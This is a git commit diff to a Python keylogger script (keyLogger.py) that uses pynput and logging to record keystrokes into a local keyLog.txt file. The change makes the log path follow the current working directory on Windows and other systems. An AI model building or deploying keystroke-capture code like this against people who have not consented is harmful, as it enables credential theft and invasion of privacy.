9d547fbfe9ac2296ecab9f9785650c6e88475e03
sv-shivansh <sv_shivansh@outlook.com>
2019-10-06 14:09:49 +0530

    Fixed auto log file creation

--- keyLogger.py
+++ keyLogger.py
@@ -1,7 +1,14 @@
 from pynput.keyboard import Key,Listener
 import logging
+import os
+import platform
 
-base_dir = "/home/shivansh/saurabh/"
+base_dir = os.getcwd()
+if platform.system()=='Windows':
+    base_dir = base_dir+'\\'
+else:
+    base_dir = base_dir + '/'
+
 logging.basicConfig(filename=base_dir+"keyLog.txt",level=logging.INFO,format='%(asctime)s: %(message)s')
 
 def on_press(key):
